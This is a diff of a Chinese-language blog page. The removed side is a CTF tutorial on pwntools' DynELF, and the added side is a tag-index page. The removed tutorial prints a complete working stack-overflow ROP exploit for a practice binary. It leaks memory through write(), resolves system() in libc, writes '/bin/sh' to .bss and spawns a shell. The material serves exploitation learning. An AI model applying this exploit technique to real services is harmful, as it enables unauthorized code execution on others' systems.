@@ -94,7 +94,7 @@
 
 
 
-  <meta name="keywords" content="pwn," />
+  <meta name="keywords" content="YunGong" />
 
 
 
@@ -107,16 +107,12 @@
 
 
 
-<meta name="description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习之DynELF的使用">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="YungGong">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/tags/Tweak/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
-<meta property="og:updated_time" content="2020-04-27T08:38:08.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习之DynELF的使用">
-<meta name="twitter:description" content="本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。">
+<meta name="twitter:title" content="YungGong">
 
 
 
@@ -146,13 +142,13 @@
 
 
 
-  <link rel="canonical" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/"/>
+  <link rel="canonical" href="http://yunnigu.dropsec.xyz/tags/Tweak/"/>
 
 
 
 
 
-  <title>pwn学习之DynELF的使用 | YungGong</title>
+  <title>标签: Tweak | YungGong</title>
   
 
 
@@ -171,7 +167,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -299,253 +295,54 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block tag">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>Tweak<small>标签</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Yun">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/Night.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="YungGong">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
+            <a class="post-title-link" href="/2021/06/28/AntiAntiDebug助手/" itemprop="url">
+              
+                <span itemprop="name">AntiAntiDebug助手</span>
+              
+            </a>
         
-          <h1 class="post-title" itemprop="name headline">pwn学习之DynELF的使用</h1>
-        
+      </h2>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-19T15:54:57+08:00">
-                2016-11-19
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-27T16:38:08+08:00">
-                2020-04-27
-              </time>
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-      <div>
-        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-  <div>有钱的捧个钱场</div>
-  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-    <span>打赏</span>
-  </button>
-  <div id="QR" style="display: none;">
-
-    
-      <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/WeChat.jpg" alt="Yun 微信支付"/>
-        <p>微信支付</p>
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2021-06-28T16:56:14+08:00"
+              content="2021-06-28" >
+          06-28
+        </time>
       </div>
-    
 
-    
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/AliPay.jpg" alt="Yun 支付宝"/>
-        <p>支付宝</p>
-      </div>
-    
-
-    
-
-  </div>
-</div>
-
-      </div>
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2016/11/19/pwnѧϰrop֮x86ƪ/" rel="next" title="pwn学习rop之x86篇">
-                <i class="fa fa-chevron-left"></i> pwn学习rop之x86篇
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/11/21/pwnѧϰrop֮x64ƪ/" rel="prev" title="pwn学习rop之x64篇">
-                pwn学习rop之x64篇 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
-
-    <div class="post-spread">
       
     </div>
+
   </div>
+  
+  
+  
+
+  
 
 
           </div>
@@ -553,10 +350,6 @@ p.interactive()
 
 
           
-
-  
-
-
 
         </div>
         
@@ -577,17 +370,8 @@ p.interactive()
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -687,22 +471,6 @@ p.interactive()
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#leak函数"><span class="nav-number">1.</span> <span class="nav-text">leak函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找地址"><span class="nav-number">2.</span> <span class="nav-text">寻找地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最终的exp"><span class="nav-number">3.</span> <span class="nav-text">最终的exp</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -853,10 +621,6 @@ p.interactive()
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
